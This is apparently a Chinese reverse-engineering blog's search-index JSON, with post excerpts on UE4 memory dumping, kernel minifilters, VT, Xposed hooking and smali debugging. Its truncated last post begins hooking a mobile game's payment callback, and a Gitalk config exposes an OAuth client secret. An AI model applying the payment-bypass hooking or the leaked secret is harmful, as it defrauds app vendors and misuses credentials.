{"pages":[{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://blog.1024w.com/img/avatar.jpg 网站名称：布墨 网站地址：https://blog.1024w.com 网站简介：技术分享,学习笔记。 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"待添加","link":"/about/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"UE4 dump","text":"根据exe的属性中的详细信息获取UE4的版本号并下载相应的UE4版本源码 版本为：4.22.2 获取 Gobject 地址 调试符号：FUObjectArray GUObjectArray; 在GameViewportClient.cpp下的Draw函数中 调用了PlayerController-&gt;IsPendingKill() IsPendingKill 中使用了 GUObjectArray因为IsPendingKill是内联函数所以IDA中就变成了 我们分析后就可以找到Gobject了 所以我需要定位到Draw函数，我们可以根据字符串CanvasObject来定位到函数 TUObjectArray ObjObjects address = 00007FF66023CA70 然后通过ObjObjects 就今天找到FUObjectArray GUObjectArrayObjObjects是FUObjectArray的一个属性 获取 GNames 地址 通过ByteProperty字符串找 dump name dump object需要修复： FUObjectArray 结构体 TUObjectArray 结构体 FUObjectItem 结构体 UObjectBase 结构体","link":"/2020/08/26/UE4dump/"},{"title":"WinDbg","text":"命令 !idt 查看中断表 dt _KTSS64 !process 0 0 查看所有进程 快捷键","link":"/2020/08/26/WinDbg/"},{"title":"frp反向代理工具","text":"github地址：https://github.com/fatedier/frp 配置 frps.ini 启动 frps 程序 配置 frpc.ini 启动 frpc 程序","link":"/2020/08/26/frp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"},{"title":"minifilter-学习笔记1","text":"Minifilter与legacy filter区别 新一代的文件过滤框架：Minifilter 比sfilter加载顺序更易控制，altitude被绑定到合适的位置。 可卸载能力。 Callback模型仅需要处理操作的能力。 兼容性更好。 名字处理更容易 安装方式（.inf/动态加载） 通信方式（port） 同样遵循IRQL,锁等内核开发通用机制 FltCreateFile/ZwCreateFile Altitude值：20000-429999 每个minfilter驱动必须有一个叫做altitude的唯一标识符，一个minifilter驱动的alititude定义了它加载时在I/O栈中相对其他minifilter驱动的位置。值越小，栈中位置就越低 FSFilter Anti-Virus 320000-329999 此组包括在文件I/O期间探测并杀毒的过滤驱动. FSFilter Encryption 140000-149999 此组包括在文件I/O期间加密和解密数据的过滤驱动. minifilter框架（1） 123456789101112131415161718typedef struct _FLT_REGISTRATION { USHORT Size; USHORT Version; FLT_REGISTRATION_FLAGS Flags; const FLT_CONTEXT_REGISTRATION *ContextRegistration; const FLT_OPERATION_REGISTRATION *OperationRegistration; PFLT_FILTER_UNLOAD_CALLBACK FilterUnloadCallback; PFLT_INSTANCE_SETUP_CALLBACK InstanceSetupCallback; PFLT_INSTANCE_QUERY_TEARDOWN_CALLBACK InstanceQueryTeardownCallback; PFLT_INSTANCE_TEARDOWN_CALLBACK InstanceTeardownStartCallback; PFLT_INSTANCE_TEARDOWN_CALLBACK InstanceTeardownCompleteCallback; PFLT_GENERATE_FILE_NAME GenerateFileNameCallback; PFLT_NORMALIZE_NAME_COMPONENT NormalizeNameComponentCallback; PFLT_NORMALIZE_CONTEXT_CLEANUP NormalizeContextCleanupCallback; PFLT_TRANSACTION_NOTIFICATION_CALLBACK TransactionNotificationCallback; PFLT_NORMALIZE_NAME_COMPONENT_EX NormalizeNameComponentExCallback; PFLT_SECTION_CONFLICT_NOTIFICATION_CALLBACK SectionNotificationCallback;} FLT_REGISTRATION, *PFLT_REGISTRATION; IRP_PAGING_IO 是系统发起的IO操作 IRP_NOCACHE 设置标记 FILE_NO_INTERMEDIATE_BUFFERING： App-&gt;IO-&gt;FSD-&gt;DISK IRP_CACHE: 用户默认设置流程：App-&gt;IO-&gt;FSD-&gt;CC(缓存管理器)-&gt;MM(内存管理器)(-&gt;FSD-&gt;DISK); IRP_XXX_PAGING_IO: MM-&gt;FSD-&gt;DISK inf class:https://docs.microsoft.com/zh-tw/windows-hardware/drivers/ifs/file-system-filter-driver-classes-and-class-guids 参考文章:FLT_REGISTRATION结构体","link":"/2020/10/27/minifilter-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"},{"title":"vt学习笔记-1(基础)","text":"VT是什么？R0 - R3VT R-1虚拟化-&gt;硬件物理资源（寄存器）VT是虚拟化，虚拟硬件物理资源 VT的三种方式 VT-X 虚拟化CPU 可以虚拟化-中断，异常，内存，一些寄存器指令 VT-D 虚拟化IO 虚拟化外部设备 嵌入式，服务器 VT-C 虚拟化网络 服务器 VT host与guest之间的关系 Host端 VT VMM 虚拟化管理guest端 操作系统，软件 VN VMX是 VT-X架构 虚拟机能有几个 每一个核能有一个虚拟机，每一个核只能绑定一个vmcs 怎么退到VT管理器？ 主动触发：VT框架在使用的时候，必须设置的被动触发：VT设置过需要拦截的，可选 VT双机调试搭建.VMX添加","link":"/2020/08/27/vt%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1(%E5%9F%BA%E7%A1%80)/"},{"title":"内核逆向分析中有趣的技巧","text":"判断地址是否有效","link":"/2020/09/27/%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%AD%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"title":"常用代码笔记 - 获取系统版本号","text":"1234567891011121314151617181920212223242526272829303132333435typedef enum _ENUM_WINDOWS_VERSION{ WINDOWS_7 = 0x0610, WINDOWS_7_SP1 = 0x0611, WINDOWS_8 = 0x0620, WINDOWS_8_1 = 0x0630, WINDOWS_10 = 0x0A00,hbnjmbn WINDOWS_10_RS1 = 0x0A01, // Anniversary update WINDOWS_10_RS2 = 0x0A02, // Creators update WINDOWS_10_RS3 = 0x0A03, // Fall creators update WINDOWS_10_RS4 = 0x0A04, // Spring creators update WINDOWS_10_RS5 = 0x0A05, // October 2018 update} ENUM_WINDOWS_VERSION;RTL_OSVERSIONINFOEXW stOSVersionInfo = { 0 };stOSVersionInfo.dwOSVersionInfoSize = sizeof(stOSVersionInfo);status = RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;stOSVersionInfo);if (!NT_SUCCESS(status)) return status;ULONG ulWindowsVersion = (stOSVersionInfo.dwMajorVersion &lt;&lt; 8) | (stOSVersionInfo.dwMinorVersion &lt;&lt; 4) | stOSVersionInfo.wServicePackMajor;switch (ulWindowsVersion){ case WINDOWS_7: case WINDOWS_7_SP1: case WINDOWS_10: case WINDOWS_10_RS1: case WINDOWS_10_RS2: case WINDOWS_10_RS3: case WINDOWS_10_RS4: default: break;}","link":"/2020/09/27/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7/"},{"title":"调试与反调试","text":"嗨，请准确无误地输入密码查看哟！ 2358eda3f2cd103235f722ed9aff763062638947aee6298fb853130e59f863611a83d4d1034f431611e2cef01b6b1de0ed1d96839c659b31b40b14d58c5b08d21aac017beaf08a48a385093da2a93df7e430608aed57ff5a9405f85ee0bcee2ef4c1729cfabd37f5db36367fe46d818024a4c4d134b1c9082ab1c5e69c296c3dc5acfc14cc0d5d4ad9648b367e983f6252947a78725d8d070533e34cc094f0ead89cf8b32b0851f8a89a4d58da326866bd856b56c19b2ee0ea41307a9ae3810961cf1496c4d635acbd19ad2fe34100624ece7bac664f52a8cae2a364961386c00833322d9edf8bbc8c1893ffd2688af87691fa871beb57df00805eb78a8712653e4d6ddf91393b3449ef439bfedd0ef318db744d0d3faf9020cb159f82c4e3c8336997c720b562d1c4de06b594938f0baae9d40e2aa43822143209da9455948ad227259362053091206648cead712a059eecaff4075c07e143e1784837f35df143dd7e16d54314e032ac62dc29c2f715ed7513cf52c6b7fd99ece748e0dec28e1f23f0a7de5da16dafbd25f89ba5d5d661ac0b93a32c1367ada9b605b64f1f5deacbe77d3852f3e312bb229c1023c496c7f56ff532b764430fad97a9b9a4be59e166ac5f401303a9e15f23ca54ca1a87ca14796683caa9d0d37d5717cb68aa2e26d084bc2283eb4827d3089838ea86e55f73a447040ee6388a927c916ba9c96165e17d055e2ef836b266c8c6d2405b51f1496922b1301a2d640a8a031cefa611087c46a732be4a95b33795f737fa36ebe88997284b5dd6d22d39122b372306c11f9ba84b9e39ad78a6349535ccaa6db31648292de2f46fc0855e1c4a8249cb2e29e1d1b0d821f386d1b0f83de90bca10a6082068ca9cc418ed8899178cc6c0b58cd24e915029e04f6dc0abfee6ab91c3ce95dccdce8358ae7039cfdf8c85595fa6fa45f418cc0164146b0cd755f96b89bd1a26c33a1430e8e5ba5e243421a9e33de564e89d1cb4d6859316a54291c90e9af3390dd3ac60937b6baa6ad656d3020532a0c992ad20c458e0a0f8e0195ed7d795dace3878628d523aa15cac9941dc5645428634f9eefa1391e68c8243b355100e36369b90c644bf080a69050a77b302d59bad564a0149a6f8b8c204e1e67914fb4357fce4f0aee61af1d5a982dbb3a9a73ce12c675806ba1808deb33ceac60684650d0626b8d5635cbbcf180347a6f8dd280a9df2195cf4dd183d9ffd0e987486cd3c74cecf1c924b6e3d0e2b2cfa817f2258ac29d8b6b82f454851fb02fce970fc7e571f2ae873c135d1fdd1f5d13172946c1f6e24b08c497381d7200313193be5d66205425f3febc4722ef62c1bb28a39ade3c306d314a5df89de52961588d12e33c89049e8d22d3b39d812b87ae3b9da32cb3426c9b7552431394d95bd562342af635ad0d55198e3705cb7795e0a98f104176941e4f0ecbafdcbf85cb4dae0633ae725b74130657ef9f90f43f7ff0b6306c0e3e84eda8b06bcceda953f3fc866499ca640569c1fe825d3b51d0ceb7a3d5b6ee818f0c37475582d5339371879ac299e20303ac95eae8f8e955bebd0aa30cfa70db038fda3d5045233444a3d0e8fa5ddafefcb05a41fa6ba73ebb310aca2ed52d0842608ffd6201d302d8f631b3a01ed1d8ee4f132d9fbdbc6e91fb6c9f7d244e8cc8541ee6eac0ef83e4e59114c37dc92f1e56bb3aaee7873f2f2098eca3f6a3d2eabdf2130bc448477f9a8cbb7e40b0c91cfb0ef16ae77b107b6b5c4d77829af1d9fa92f024250fbe05614a5a4ada903bfb90ed8e32ff6210461a6037bb1cd33b29df743e2c94e1586e22dcc8cecf6264605b90b3a88981486bd096949721d97dbf7c3b88959af17ef8c0bab6cb2eb5141a9cd3258cb129222d7fdc91bc4f8d8ab6a0f7a2cd8faca17c5aadf4d8ca70b6b3062c1f59fbe91ac0ed53e737c510b34f6e05b131059c4a2a61a6c42ee4ece801e8d076bf96d1236091f572930fc20c9cf925fdb5e206e9037d63b1cb434701f85a7467e1003c27cf4223acb3330d09928de306d708186d151f5b2c29f896c07e81fa23e8ecdf1a69abb04c04bec071c17a536aef08dd6d49163f431e0c2b233d39432acc6208572e2c3566f41c174d68050330849e88896569cc321fec481bd7d4c37e90fbef8d7a97b7f1d63041f875fcb750688eb6d32becd703f95cbf4f52559de864c0d9a5f22225f038f1e045d4c8ab054772bc70ad3a1ef06560fe080167adb566921fd6f770f76fc5a47a1e96dd8e70a883d82b47ad8c5208515aa213326dade6e29b654533f30d08c7733aa7b2232a3834ec1f14dfea7d4d43b78ff5483dde6df8d0c42713652d88adff8c08730e9333b26b1e620e0052d75b0bc3e1753571fd51c2c1681a84b7b7f11948de4b82e1b751aee200305a2fa4b087d77680b1bd1b96d44d5f2a44b09158007fceb154087c153dc68d75c281c0f4dbb313ef85c47862b22df6b3c26edd91c195da08b62103222f7f9435b36dc27e2d392adb5b4445d668e172448dcf1c93d39536f3f14d389e36a4b37f1f4e28d84faaba8f7e4fa95f28d46cbc9f7f5baa3be31ca7de756ed90a859238a6376ba0f8f88705498cc97737da7d8b9c84d1b0f163ecda4477a002e6e727655a90ddd4cf25249535218b0c9eab52827c47e697b89149967ec3b5dd8707448a447ce0070abe9cd41735c24a281cae7d3aa41abc6d05ee2d95fdd95c99c0d5a8ae60fce4c70a8bc49a0057f977e2df1b098aec63bf04864b5a21647bf182a9dfaa29538b072865ee727d377e23a2f959dd036bf2db9b4b30a455a35255748f68d561600062f1e5c253e6b01dedb3643d6ce8dde6bc2fe7a3af814a5c6f20c4c3ef513e3987e12d4ca4cee64748394e6980705205f04e3194c182a774a0f3b5f687c5c89a5e228dc9367e5927e6fd06134ec72ec8e7ce6750e78f7d87f900bc9de3cfcfd0b202b60701a323be4e7e86b002d65f8c57cdb670498916ae8723a7e4af20bc98ee7d668df0daf2819174c8a773f61e8b727321fec7d06911b2e1eab17e805dae3f77211189059827c6b52e540e8f52ec66c229edb0d78217de01c769ba19d9bd2d05877e6be702ba0aec6e80fd9e5b67a66096d8ce082e9243d2545c1d7db8d20ea219904306b2c4920805472ff13a2c28d787bc4bef7be77c4375d2702f406d9f9e5be85410c2df952f0097b91be42038dc5a4f17278e8c8c9df8c317930663a834659236220704397689aca0b219b39f62cea31fbb0d327e6e71a9b280f847324480359c01c32c61ae0722807fe6cf2174ef17eecc9355b19288cb472357b17a0eba52123031e7ccea362e76ded834d9c097d30e3065b7ef09831e27970cd4e807a5794f25e3b1b9b3b8713489ff863306364747c28214db6ad7eae3efa9ceb93940829e7fd04832ed904f5d6b2bfc1034f7e550ced443d7e2b36b9335dbbaa0d93a6cc6b2d0c558b9064e503bae754f384246c624e7744c7181f6cc8f57ed7e205bee7520280456c1d4e8c498792253ca6d30ab6ff99f9e9d38bc1707c9b09c977b107a4af5fea3a50875bed645f261851e8759a84f4cb08a9bb45ea2c5d52bb5981d80259889665c3cba18c5cb48610598a53c175c16772d0ada3b6b17507d81f8fbefa23ce9c80cd78d70b6c43b3d1fe3a4a73b64afe5f1be125ca3f53817cd495a484da361e9c2c2fc0f5e19b9308f57b2c87ddcd3994283c336a85545c94fad75dbc7db1227318f7751d214146040cfa1f521b949df60c4a36140e44ddf3d6c6b34daf347a45d4f67c2df440d70421664c8eb43fd8886264b227530e85f4fa604be1d395f1d83e33578f073ab985a8fccb27285b3ad73e6226a3f11d39e1cf12a05c2654dc296c61df79edcfadf97478c3adf1f3a061ef525330dbefd16d8de121fe7e70e3a5e4690e398fc7104ee9258b9a05b093c554f83cbf6ede97aa6ae5368c81448c824c089fb5dc999e03b50e7a6c6e566fb53da8c8bfedbad61e963901939f25b4b742f26ae3b7f8f9922c59d66dda2316cebae6e2a78580a11eacfc21a5adb211910c9881a29a0c34053011a5c66abd118b3bda081338a6144ac99bd42cfb95c9f39e42ece30df7dc9a6c7f3944b30fb2f7353c523388b571ed84940f2f774bb730b14656718b0901e8b596156fe02b032f8091a8390386894e70d4ecb3e310be1d9fb9056ee261008fdc6e445cec48c7937006bccbe891928258fd53cc40c3decdeec68c872c3f8bce3e2d3e8217bccee4ed8bfa38ded5c5d3a07befec95fc39f08d1d8b8a081e54dfe3729a0dcec43304a143ab204f102cfc1ed42eb4b74841730dc4fe6192a811449a591a60065417c1b9b5848b246fb037b070a5e3535777a764d5ea3249cf7e9175c2bccb840076bfb51146a77d35a718d6616bbf6a6dda441e7d186442485d8cb4f0974c49454cdb83e535d232e16db1689a839f18f2a6f794e28cf4e983f9efbdf05fb47ef602ca38f73e86ab2941de00329a5266aecfe0cd14c501ce714e14b972efe6ede17f5d489e279050cefec5b4f6cad385665675e7fb6b86c5f7b1d25e4580c312ade8fdad221ff3b85ec79d2edf63db51a784c96e94959f8a9cee46f1b8a70c1fb59f5ed2b8e0523de9dd176cd4e7f71c4332d148a314ce3420a0ae14d0a674329a449e95f321d8ea89d9700ceef760d3ad32785886db89c0e2cb329384b4382ea7534ecf5fe75d9ac013e262e5dc050ba96661b3acf701590864c557d1ec52625286f74b7927b498df8232fc58abdbd88383cc30286dc7d9dd59aea94bf65ec1daca7db22bfe11ba4fdd4648c75b0a5dc103e1ff758e80f544c69880e41115c4ffa34c755a434ab05f6e9ca6e7d08feb24ed76e43e1f6f23294458c0359a1231dfc686ae62ed288fad096dbb822068f68378710589c35d8bc11edfd37a2423a88fd9ba5a6d0df51f3da78b7cc75c926e83edf39ca85656ec7a739c27bfa9eda923c97168749c5f66ff518a66e0ea2093b3c21e96d5e908d76531070b213daf3fa6b69ce6a32ea0e38e981a7d68da5b31e9ee13cee6a9236718cea865a40ea234368049a803d5440a1871b651f9ac1a47223e5371c09e0b9898d81a0b3e33f5d645c2c9440d0559610647d863789325c9c4d57eb163bc0969c68fe70c646ccd1efd52ad328be4d5df3def77c986a8c73f4fc9204a3e1a55f39f2986afbff36164fa6fd13422c2ce2d8a5e2065cf3fc2cc3bc003615891b6e8cd9748f6a243f961042d2ee5d8f8d468f59a26a4ad0fcc8fca3687047af265dfe299f5d7701b1ba826f22984449ff7d379e68416c7117f688934cd76760d0074c573541add9e313c38f48551027ea7a06ee8e5939d09f381eaa3224ed9e9ed8a7d0384242a5e3928f6d6e1a775205ead3346f28d1e2f7a4c1024ba289c0ef57f8e9b7b7f512c87d8c4447f0b75b1d0c1ef862976add3cba8ec327937cdd59542d2a26b80b042214ba12ead8b59224bbf0bf09ab604b0f5ea7c976c8195d5ddfb38c9bc25eea48b84bc6143f634c672639c7f1f7c5281606c630bb695a5aeae096ea8e41b69b7ce0854bdfa7799ae84451487ff0cb0df8080721bab12a9510e1500fd7ccb41b88660df2282738b2efe348e3f093aeba575e2e1c7b9dc199d115324d0d4395db80a9ead9366cf4ce6980741a9c90f5d83be1697fae1de6b6402e97b39355b5ae0f8826ca8b289054e436a7eb020d9a142450c29b069b99653a312e00d424bec3d1f808a9bfcfc2613a1c3f631e3b469e2869a5d743f00d97f2f981435d9df5d46a3e476cd6428183918840a821c9747de019053f50ea2b82a69b83eed58122b8abf65f2979619d215f2058477c49371ebe74cee0917c0353c4262d2e2069ec6e79d2135efafcf2b906de4e5886cd10f7bd2d614df7cfe644c35f6e10e6ab07f704681a56a1d61a68c25b64255d4576ee22b651284aa3ddbccded1cadba6841cdd995d3360083e60eae46ff1e511b22c66c8a283657d2e23b652a928624597df271cea5608a6def2c1aa80113527af485d9d84feeb60e105334a6f679cc26cfdf4b98646ff86e4bc6b9500c375bfeb999cfebea9eded7fe431d34ebf52e35215a50240a30b431d08ad3b33dc9a83b0dd3f5f03ab51423dd1fadebdc6eaabe354f6beea3860445a8c469843feb04026d63738835b2ced75166a7452d59f5156a2151b56c9ed73e0a8f65986afa0c7610298d05258d7e8c3e084028eff410d2cfd57a250a0bd651abfd31cabef37e72d4784d45855fea5d4ff68226c3e54e3223267f8e3cbcc0634e8e922feb1aa60e2e7f1c82ffbd9dcfe65b928f9c59f2421192a3b319a192cc746f76ac56e005ce63ed76bf025e319185544cb4491a7f086b75a8a401df58439e9cfb2bff308ae5d0057801bdc8b768f3e4d3663e76538f705995f42d7ddd29e2d45a3adceaa7b81a044203d6aeb8b95a752aa0b9133184759a3341f2aeb9e5000b6ebf5f835a0258245f102d90addcce7842f0851f419eec82f9c1a1e5df51671598e642a62b3117e6e8181ec890d2d0a0321a0237978e35b9f3b391821818deb3a98a4edb117a3c38718a63e836e93917635527b521f2ce77c6bbbf1ec109098ecdf4ef167d96354373bc8529a98076a9b8d6f5ca2e32586aa11c0edca588fbe0724d570fb8a5b37bbd8e9e816fe81cfc91ba11be3ef5b4df160326066877d56074c992379bf59c95006bdb441952670faf67151ee02e018413c4225c6a17290ce8d91c3e06c316927bbc8a794bed705ad29a0ed0fdb4f5b878c0c490cb2dbbe79a50ffbb2e5bed60f5aec2fa6d52576937c9e6635ab2ddf85a96101bb5fec8887766f110a049cb2bd5afb539cf7aef6f4a8c83ba0c90e2b437241f867a8c9ebb9ef8b1d941d3cefbfb8a422132e0aa37893685f9d75bb123235b7a1f0189d303db47649025db27c34e7f585fc20520580ae98437672cc5b8b14be6a0ee892effb9932d8a86db6d8451f66f91ee5038812209e57c337a8a992bbd3672b34e50e0d75a8f3bd23311757e5b0a16f63dda20cc2b4d0368e011d35ac44747599cf6532c50a962eb94218af496b04f76a59987f5dbda560906d813aab9b4d6f90fc3af3dbfe47b17edd0e8d3e645b3dff38c4592a84942087cd68d742cd0f5e41c8a06e1e5714118483cedb27efd352ab9221639f5c5ae05565297298a8240e38d152082c253556f5a7ba74991d4e3057c75d16d13e1e62914f6c27a69cf6839a6808d6bb0c90e92f7bdd90e9e3a82897ac99868fbec519ca11f42f88b639206cfb64725a55b8432d0356d8664f5a80186648127598ca9f667a034a73aac3aa50591d5b2d3a2fb985cb7d07b832b2c4d4b52e590b16774d9693b74462c655c890beb6a3d1194b7036c07dedfd4e05c05360978df8462ce46f802b7eedf4990e0850b605ca9de1f921afda2087e4d3ff3a63382a940848a0d3fb29ffe7853962b32043a4a07ed251319b6791058a5dd0bb531bbedd589a11c837243d3f0127a12689c93629dcd3501a3e2e0bc6a796d068d35f10045d1bd4bebf011aa1cb023132a4098eb0497ad24b696957f64613afb65345149e976f75344f8599da242d73a15a513cc88eb0711b893830a5ed310d115349b3829e240f6f1bb677f2f66b32338875d345567dd407c8a826f925c3ddbd90b17aa4ae6a33a53838a5631d2d7d3275ff1d3300b06d90246e3aeb4ca9f47056acb974ab34a43bbb7182d22fd61d0db43701b00d59068240a6ef600e654c15a5e05efc801d2298da7a81203a5b96eeacfa326d6c01f61c9247bf847e89d17a3051810b7e23226a6958a4644cbdb9bf0a6153d0120f3d5a72403d994de1401a831a8090922d0be2cd46af7a4689abeb5a988644ca5dcaa00f5f3db453ac8dd980dab6f3193aa15613e8afb1cd88d692102974e91036b1ec7b877b4a031f1f0708d2a1e1951dd5335888dfca526b54a9e7de","link":"/2020/09/10/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"title":"记录几个vscode常用快捷键","text":"markdownlint 预览快捷键 Ctrl+Shilt+V PicGo（很棒的图床插件） 从剪切板上传图片：Ctrl + Alt + U 从本地文件夹上传图片：Ctrl + Alt + E 从输入框上传图片：Ctrl + Alt + O","link":"/2020/09/10/%E8%AE%B0%E5%BD%95%E5%87%A0%E4%B8%AAvscode%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"title":"驱动内核常用api","text":"Api PsLookupProcessByProcessId 根据ProcessId获取EProcess结构体 ObDereferenceObject(PEProcess) 解引用，修改eprocess的引用为0","link":"/2020/08/26/%E9%A9%B1%E5%8A%A8%E5%86%85%E6%A0%B8%E5%B8%B8%E7%94%A8api/"},{"title":"Android Killer 不反编译资源","text":"Android Killer 不反编译资源","link":"/2021/04/07/Android/AndroidKiller%E4%B8%8D%E5%8F%8D%E7%BC%96%E8%AF%91%E8%B5%84%E6%BA%90/"},{"title":"xposed 原理初探","text":"一、Xposed 框架实现 Hook 的原理介绍Zygote是Android的核心，每运行一个app，Zygote就会fork一个虚拟机实例来运行app，Xposed Framework深入到了Android核心机制中，通过改造Zygote来实现一些很牛逼的功能。Zygote的启动配置在init.rc 脚 本 中，由系统启动的时候开启此进程，对应的执行文件是/system/bin/app_process，这个文件完成类库加载及一些函数调用的工作。当系统中安装了Xposed Framework之后，会对app_process进行扩展，也就是说，XposedFramework 会拿自己实现的app_process覆盖掉Android原生提供的app_process文件，当系统启动的时候，就会加载由 Xposed Framework 替换过的进程文件，并且，XposedFramework 还定义了一个 jar 包，系统启动的时候，也会加载这个包：/data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar 二、Xposed框架运行的条件1.Rooted Device / Emulator （已root的手机或者模拟器）2.Xposed Installer (Xposed安装程序下载)3.Hooking Android App （要被Hook的目标 App） Xposed Framework就是一个apk包也就是上面下载的Xposed安装程序，下载后用下面的命令安装到手机上或者模拟器：adb install de.robv.android.xposed.installer_v32_de4f0d.apk appframeworkC++linux内核 linux内核 –&gt; init –&gt; app_process –&gt; Zygote Zygote进程在启动过程中，除了创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，同时还会注册一些Android核心类的JNI方法到前面创建的Dalvik虚拟机实例中去。 一个应用程序被孵化出来的时候，其不仅会获得Zygote进程中的Dalvik虚拟机实例，还会与Zygote一起共享Java运行时库，这也是可以将XposedBridge.jar这个jar包加载到每一个Android应用中的原因。 Xposed_zygote进程启动后会初始化一些so文件（/system/lib、/system/lib64），然后进入XposedBridge.jar中的XposedBridge.main中加载模块，初始化jar包完成对一些关键Android系统函数的hook。 Hook则是利用修改过的虚拟机将函数注册为native函数。然后再返回zygote中完成原本zygote需要做的工作。 META-INF/ 里面有文件配置脚本 flash-script.sh 配置各个文件安装位置。system/bin/ 替换zygote进程等文件system/framework/XposedBridge.jar jar包位置system/lib system/lib64 一些so文件所在位置xposed.prop xposed版本说明文件 Androidhttps://developer.android.google.cn/ SDK刷机包下载x86：https://dl-xda.xposed.info/framework/x86_64：https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip VirtualApphttps://github.com/asLody/VirtualApp Android Hook技术防范漫谈https://tech.meituan.com/android_anti_hooking.html XPOSED魔改一https://bbs.pediy.com/thread-258639.htm 企业壳反调试及hook检测分析https://mp.weixin.qq.com/s/StnqWtZMFCu09snIEGi1RQ 破解某支付软件防Xposed等框架Hook功能检测机制https://mp.weixin.qq.com/s/Je1kRksxHTTYb4l9x3bTmQ 阿里系产品Xposed Hook检测机制原理分析https://bbs.pediy.com/thread-218848.htm 抖音短视频检测 Xposed 分析（一）https://www.52pojie.cn/thread-684757-1-1.html 抖音短视频检测 Xposed 分析（二）https://www.52pojie.cn/thread-691584-1-1.html QQ 浏览器 中的Hook,Root,模拟器,Debug,DexFile检测技术https://bbs.pediy.com/thread-250871.htm 检测Android虚拟机的方法和代码实现https://mp.weixin.qq.com/s/tamMeh2xsi6L37jjizW_rA","link":"/2021/04/07/Android/Xposed%E5%8E%9F%E7%90%86%E5%88%9D%E6%8E%A2/"},{"title":"AndroidStudio调试smali代码","text":"所需插件Android Studio 4.0及以上需要smalidea-0.06插件Android Studio 4.0以下需要smalidea-0.05插件安装插件流程 获取到对应的smalidea插件包 (https://bitbucket.org/JesusFreke/smalidea/downloads/) 选择AndroidStudio左上角File -&gt; Settings -&gt; Plugins -&gt; 齿轮图标 -&gt; Install Plugin from Disk -&gt; 选择插件包（不需要解压） 保存并重启IDEA即可 注意事项smali代码调试不能开启ddms（开启ddms会占用端口）需要开启系统调试开关或者修改配置文件添加android:debuggable=”true” (模拟器默认都是开启系统调试开关的,xposed+bdopenrer插件可以设置系统调试开关)端口占用问题 ，一般都是电脑端某个程序占用了调试端口8700操作流程 获取APK的smali文件 可以使用 androidkiller反编译 AndroidStudio打开已存在工程选择获取到的smali文件夹 设置项目属性：右击项目 -&gt; Mark Directory as -&gt; Sources Root 配置调试属性： -&gt; Run -&gt; Edit Configurations -&gt; add -&gt; remote 命令行启动调试模式 adb shell am start -D -n packagename/.MainActivity 查看进程ID ps |grep packagename 配置端口转发：adb forward tcp:8700 jdwp:pid 名称：PingAn1包名：com.testjava.jack.pingan1入口：com.testjava.jack.pingan1.MainActivity版本信息：Ver：1.0(1) SDK：19 TargetSDK：26 Activity： com.testjava.jack.pingan1.MainActivity Receiver： Service： Permission： https://www.jianshu.com/p/c9a7debfbf91","link":"/2021/04/07/Android/AndroidStudio%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"pdf钓鱼样本分析","text":"查看当前连接设备adb devices 查看日志adb logcat 安装apk文件adb install xxx.apk 卸载Appadb uninstall com.zhy.app 进入命令行adb shell 查看当前活动界面信息adb shell dumpsys activity top |findstr pid","link":"/2020/08/26/Android/adb%20%E5%91%BD%E4%BB%A4/"},{"title":"jeb调试smali代码","text":"优点缺点调试大型APP容易崩，出错显示smali代码和apktool反编译后的不一样 流程 把要调试的APP拖入到jeb工具中 调试器APP，先打断点","link":"/2021/04/07/Android/jeb%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"xposed 小实战","text":"经典贪吃蛇大作战关键字符串：支付取消 1234567891011121314151617181920//zombie.class 11,Lcom/qy/zombie/zombie;-&gt;DX_Pay(Ljava/util/HashMap;)V+4h,,public static void DX_Pay(HashMap arg3) { new AlertDialog$Builder(zombie.activity); EgamePay.pay(zombie.activity, ((Map)arg3), new EgamePayListener() { public void payCancel(Map arg4) { Toast.makeText(zombie.activity, &quot;支付取消&quot;, 0).show(); zombie.BuyFailed(); } public void payFailed(Map arg4, int arg5) { Toast.makeText(zombie.activity, &quot;支付失败&quot; + arg5, 